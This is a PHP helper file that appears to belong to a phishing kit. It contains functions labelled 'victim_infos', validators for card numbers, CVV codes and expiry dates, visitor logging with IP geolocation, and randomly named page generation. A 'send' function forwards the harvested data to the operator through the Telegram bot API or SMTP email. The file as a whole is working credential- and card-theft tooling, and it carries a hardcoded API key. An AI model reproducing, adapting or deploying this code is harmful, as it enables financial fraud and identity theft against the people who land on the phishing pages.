<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/
    
    require_once 'vendor/autoload.php';
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    function create() {
        $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $length   = strlen($letters) - 1;
        $random   = "";
        for($p = 0; $p < 6; $p++) {
            $random .= $letters[mt_rand(0, $length)];
        }
        $randomFile = 'fV5EjH/' . $random . '.php';
        $file = fopen($randomFile, "w");
        return ['file' => $file, 'name' => $random . '.php', 'path' => $randomFile];
    }
    function go($page) {
        $create = create();
        $content = file_get_contents(TEMPLATES . $page . '.txt');
        fwrite($create['file'], $content);
        fclose($create['file']);
        $_SESSION[$page . '_path'] = $create['path'];
        return $create;
    }

    function removedir() {
        $dir = $_SESSION['folder'];
        array_map('unlink', glob("../$dir/*.*"));
        rmdir("../" . $dir);
    }
    
    function errclass($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
    function errmsg($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="errmsg">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
    function get_value($value) {
        if( isset($_SESSION[$value]) ) {
            return $_SESSION[$value];
        }
    }
    function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
    function validate_one($number = null) {
        $card = $string = str_replace(' ', '', $number);
        if( validate_number($card) == false || strlen($card) < 15 ) {
            return false;
        }
        return $card;
    }
    function validate_three($number = null) {
        if( validate_number($number) == false || strlen($number) < 3 ) {
            return false;
        }
        return $number;
    }
    function validate_two($month,$year) {
        if( validate_number($month) == false || strlen($month) < 2 || $month > 12 ) {
            return false;
        }
        if( validate_number($year) == false || strlen($year) < 2 || $year < 22 ) {
            return false;
        }
        return $month . '/' . $year;
    }
    function validate_name($name) {
        if (!preg_match('/^[\p{L} ]+$/u', $name))
            return false;
        return true;
    }
    function validate_email($email) {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL))
            return false;
        return true;
    }
    function validate_number($number,$length = null) {
        if (is_numeric($number)) {
            if( $length == null ) {
                return true;
            } else {
                if( $length == strlen($number) )
                    return true;
                return false;
            }
        } else {
            return false;
        }
    }
    function validate_date($date, $format = 'Y-m-d H:i:s') {
        $d = DateTime::createFromFormat($format, $date);
        return $d && $d->format($format) == $date;
    }
    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    function get_ip_infos($ip) {
        $ip_infos = file_get_contents("https://pro.ip-api.com/php/". $ip ."?key=I8h97HB1QkUVKV0&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query");
        $ip_infos = unserialize($ip_infos);
        return $ip_infos;
    }
    function victim_infos() {
        $detect = new foroco\BrowserDetection();
        $useragent       = $_SERVER['HTTP_USER_AGENT'];
        $result          = $detect->getAll($useragent, 'JSON');
        $result          = json_decode($result,true);
        $ip             = get_client_ip();
        $browserName    = $result['browser_name'];
        $browserVer     = $result['browser_version'];
        $device_type       = $result['device_type'];
        $os_name   = $result['os_name'];
        $os_version   = $result['os_version'];
        $hostname       = gethostbyaddr(get_client_ip());
        $message        = "IPA    : $ip | $hostname" . "\r\n";
        $message        .= "Agent : $browserName | $browserVer | $device_type  |  $os_name $os_version"  . "\r\n\r\n";
        return $message;
    }
    function telegram_message($message) {
        $curl = curl_init();
        $token  = TELEGRAM_TOKEN;
        $chat_id  = TELEGRAM_CHAT_ID;
        $format   = 'HTML';
        curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $chat_id .'&text='. urlencode($message) .'&parse_mode=' . $format);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
        $result = curl_exec($curl);
        curl_close($curl);
        return true;
    }
    function send($subject,$message) {
        if( RECEIVE_VIA_TELEGRAM == 1 ) {
            telegram_message($message);
        }
        if( RECEIVE_VIA_EMAIL == 1 && RECEIVE_VIA_SMTP == 1 ) {
            $mail = new PHPMailer;
            $mail->IsSMTP();
            $mail->Host = SMTP_HOSTNAME;
            $mail->Port = SMTP_PORT;
            $mail->SMTPAuth = true;
            $mail->Username = SMTP_USER;
            $mail->Password = SMTP_PASS;
            $mail->SMTPSecure = '';
            $mail->SMTPAutoTLS = false;
            $mail->From     = SMTP_FROM_EMAIL;
            $mail->FromName = 'Z0N51';
            $mail->Subject  = $subject;
            $mail->Body     = $message;
            $mail->AddAddress(RECEIVER);
            $mail->Send();
        } else {
            if( RECEIVE_VIA_EMAIL == 1 ) {
                $mail           = new PHPMailer;
                $mail->From     = 'localhost@domain.com';
                $mail->FromName = 'Z0N51';
                $mail->Subject  = $subject;
                $mail->Body     = $message;
                $mail->AddAddress(RECEIVER);
                $mail->send();
                echo $mail->ErrorInfo;
            }
            if( RECEIVE_VIA_SMTP == 1 ) {
                $mail = new PHPMailer;
                $mail->IsSMTP();
                $mail->Host         = SMTP_HOSTNAME;
                $mail->Port         = SMTP_PORT;
                $mail->SMTPAuth     = true;
                $mail->Username     = SMTP_USER;
                $mail->Password     = SMTP_PASS;
                $mail->SMTPSecure   = '';
                $mail->SMTPAutoTLS  = false;
                $mail->From         = SMTP_FROM;
                $mail->FromName     = 'Z0N51';
                $mail->Subject      = $subject;
                $mail->Body         = $message;
                $mail->AddAddress(RECEIVER);
                $mail->Send();
            }
        }
    }
    function visitors() {
        $ip_infos = get_ip_infos(get_client_ip());
        $Browser = new foroco\BrowserDetection();
        $useragent       = $_SERVER['HTTP_USER_AGENT'];
        $result          = $Browser->getAll($useragent, 'JSON');
        $result          = json_decode($result,true);
        $ip              = $ip_infos['query'];
        $date            = date("Y-m-d H:i:s", time());
        $os_type         = $result['os_type'];
        $os_name         = $result['os_name'];
        $device_type     = $result['device_type'];
        $browser_name    = $result['browser_name'];
        $browser_version = $result['browser_version'];
        $country         = $ip_infos['country'];

        $str = " <tr><th scope='row'>$ip ($country)</th><td>$date</td><td>[$device_type] $browser_name $browser_version</td></tr>";
        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
    }

    function rr() {
        $rand = rand(6, 9);
        $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $length   = strlen($letters) - 1;
        $random   = "";
        for($p = 0; $p < $rand; $p++) {
            $random .= $letters[mt_rand(0, $length)];
        }
        return $random;
    }

    function semantic() {
        $words = array('blade','advice','medium','brink','adjust','kidney','absolute','boom','morale','wealth','basis','winner','knock','worth','month','proof','kitchen','poison','beef','prevent');
        $words_count = count($words) - 1;
        $rand = rand(0, $words_count);
        return $words[$rand];
    }

    function get_phone() {
        $fnums = substr($_SESSION['phone'], 0, 3);
        $lnums = substr($_SESSION['phone'], -3);
        return $fnums . "****" . $lnums;
    }
    
    function get_email() {
        $ex_email = explode('@',$_SESSION['email_address']);
        $fchar = substr($ex_email[0], 0, 3);
        return $fchar . "*******@" . $ex_email[1];
    }

    function get_text($place) {
        global $lang;
        return $lang[$place][$_SESSION['lang']];
    }

?>